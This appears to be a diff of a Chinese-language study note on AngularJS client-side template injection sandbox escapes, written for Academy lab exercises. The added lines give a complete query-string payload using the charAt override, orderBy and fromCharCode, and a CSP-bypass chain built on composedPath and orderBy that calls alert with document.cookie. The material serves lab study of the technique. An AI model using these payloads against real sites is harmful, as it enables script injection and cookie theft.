@@ -8,7 +8,8 @@ Family: [[client-side-template-injection-family]]. 在 Academy CSTI 两题(批38
 
 ## 两条可用的逃逸腿
 
-1. **charAt override**(废掉沙箱的 AST 重写):`toString().constructor.prototype.charAt=[].join`。执行后 `String.prototype.charAt` 即 `[].join`,`isIdent()` 恒真,该次**之后**的 parse 不再插守卫。 - 只对**后续** parse 生效 ⇒ 载荷必须在那之后被 parse(另一个参数、或 runtime 求值的 `orderBy` 字符串谓词)。 - **副作用:词法器本身也依赖 charAt**。override 之后新编译的 getter 是坏的:实测 `$parse('constructor.constructor(b)()')({b:'alert(1337)'})` → JS `ReferenceError: b is not defined`(与批38 的 lexerr/isecobj 同源)。所以"先 override 再跑载荷"这条路要求载荷同时过坏词法器与 ensureSafe*。 2. **CSP 变体(已收口)**:`ng-csp` 下 Function 构造器不可用,走 Angular 自有事件 + `$event.composedPath()`(返数组、过 expensive 检查,末元素是 window)+ `|orderBy:'<谓词>'`(字符串谓词由非 expensive 的 `$parse` 编译、以每个数组元素为 scope 求值)+ `(y=alert)(document.cookie)`(赋值式调用绕 isecwindow;裸 `alert(...)` 报 isecwindow)。
+1. **charAt override**(废掉沙箱的 AST 重写):`toString().constructor.prototype.charAt=[].join`。执行后 `String.prototype.charAt` 即 `[].join`,`isIdent()` 恒真,该次**之后**的 parse 不再插守卫。 - 只对**后续** parse 生效 ⇒ 载荷必须在那之后被 parse(另一个参数、或 runtime 求值的 `orderBy` 字符串谓词)。 - **"override 之后编译出来的东西是坏的"是拆分调用造成的假象(批49 作废)**:把 override 与载荷拆成**两次独立** `$parse` 调用时会看到 NaN / 静默 no-op;但把两者写进**同一条表达式**(override 作语句1,`[1]|orderBy:…` 作语句2)时,`orderBy` 在运行时编译的谓词工作正常。
+- **without-strings 题的成文载荷**(批49 已收口):`?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`。服务端每个参数生成 `var key='<参数名>'; $scope.query[key]='<值>'; $scope.value=$parse(key)($scope.query);`(顺序 = Java HashMap),**参数名**即表达式,名字里的 `=` 要发 `%3D`。见 [[records/lab-angular-sandbox-escape-without-strings]]。 2. **CSP 变体(已收口)**:`ng-csp` 下 Function 构造器不可用,走 Angular 自有事件 + `$event.composedPath()`(返数组、过 expensive 检查,末元素是 window)+ `|orderBy:'<谓词>'`(字符串谓词由非 expensive 的 `$parse` 编译、以每个数组元素为 scope 求值)+ `(y=alert)(document.cookie)`(赋值式调用绕 isecwindow;裸 `alert(...)` 报 isecwindow)。
 
 ## 预算与触发(CSP 变体,80 字符上限)
 
